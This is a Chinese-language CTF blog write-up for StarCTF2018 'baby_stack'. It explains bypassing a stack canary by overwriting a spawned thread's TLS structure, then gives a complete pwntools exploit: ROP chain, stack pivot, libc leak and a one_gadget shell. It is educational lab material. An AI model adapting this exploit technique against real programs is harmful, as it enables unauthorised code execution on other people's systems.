---
title: 绕过Canary的其他姿势 StarCTF2018 baby_stack
date: 2020-02-20
tags:
    - bypass canary
categories:
    - Pwn
keywords: 
    - 覆写TLS结构体
description: 
    - CTF
toc: true
---
作者：LordRiot
#### emmmm今天把手机摔坏导致很不爽，于是搞了好几个小时这个题，最后发现自己是个rz orz


### StarCTF2018 baby_stack
今天等修手机的时候想起昨天看到ichunqiu新春战役的BFnote里利用覆写TLS结构体bypass了canary，于是就很好奇其具体原理，查了一波发现，那一题是利用libc2.23的特殊机制覆写了main线程的TLS，然后找到另一个覆写TLS结构体的题，即是本题，不过不同的是，本题直接利用pthread_create函数，加了个线程出来，然后由于该线程的栈在其TLS结构体之上，所以可以覆写成功。


这一题是我知道原理之后纯动调做的orz，就先打个断点，康康canary的值，之后跟进，直接find canary，查到其在内存中的所有位置，发现有四处，其中一处是在main线程的TLS，两处是在新线程的栈，一处是在新线程的TLS结构，然后算出偏移，直接全部覆写成'\x00'，然后由于改了TLS（TLS结构体里本身有些随机的量，例如一些在libc上的地址什么的，第一次覆写肯定无法保持，只能全覆写成0了），所以需要栈迁移一下，就read payload到新栈，然后劫持栈到新栈即可，然后似乎是由于payload长度的关系，我一度想写'/bin/sh\x00'，然后call system来getshell，但是始终不行，动调了俩小时，毫无起色，甚至我都跟着system源码单步调试了，发现似乎是payload的某个地方的覆写导致的，然后换成了one_gadget，一梭搞定，orz，原地自闭，下面贴一下exp。（one_gadget 我直接用的本地的，是2.27的，打远程的话，第一次leak出版本再获取一样的）

```
p = process('./baby_stack')

puts_plt = 0x4006F0
read_got = 0x601FD0
puts_got = 0x601FB0
new_stack = 0x602400
init_pop = 0x400B6A
init_mov = 0x400B50

pop_rdi = 0x400b73
pop_rbp = 0x4007d8
leave = 0x4008a6

fake_canary = '\x00' * 8
first_offset = 0xB0
second_offset = 0x820

fake_TLS = p64(0x603270)
fake_TLS += p64(0)
fake_TLS += p64(1)
fake_TLS += p64(0)
fake_TLS += fake_canary

rop_chain = p64(init_pop)
rop_chain += p64(0)
rop_chain += p64(1)
rop_chain += p64(read_got)
rop_chain += p64(0)
rop_chain += p64(new_stack)
rop_chain += p64(0x400)
rop_chain += p64(init_mov)
rop_chain += '\x00' * 0x38
rop_chain += p64(pop_rbp)
rop_chain += p64(new_stack - 8)
rop_chain += p64(leave)

payload = '\x00' * 0x101b
payload += rop_chain
payload += '\x00' * (second_offset - 16 - len(rop_chain))
payload += fake_TLS

p.recvuntil('How many bytes do you want to send?')
p.send(str(len(payload)))

sleep(1)
p.send(payload)

sleep(1)
p.send('\x00' * 3)

rop_chain = p64(init_pop)
rop_chain += p64(0)
rop_chain += p64(1)
rop_chain += p64(read_got)
rop_chain += p64(0)
rop_chain += p64(new_stack + 0x400)
rop_chain += p64(0x400)
rop_chain += p64(init_mov)
rop_chain += '\x00' * 0x38
rop_chain += p64(pop_rbp)
rop_chain += p64(new_stack + 0x400 - 8)
rop_chain += p64(leave)

payload = p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += rop_chain

p.recvuntil('It\'s time to say goodbye.')
p.send(payload)

p.recvline()
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
obj = LibcSearcher('puts', puts_addr)
base_addr = puts_addr - obj.dump('puts')
one_gadget = 0x4f322 + base_addr

sleep(1)
p.send(p64(one_gadget))

p.interactive()
```

本来还想水一期栈迁移和SROP的博客，但最近事情太多了，还要赶紧学堆，就先鸽了，以后有时间把return to VDSO和SROP一块写了: - )
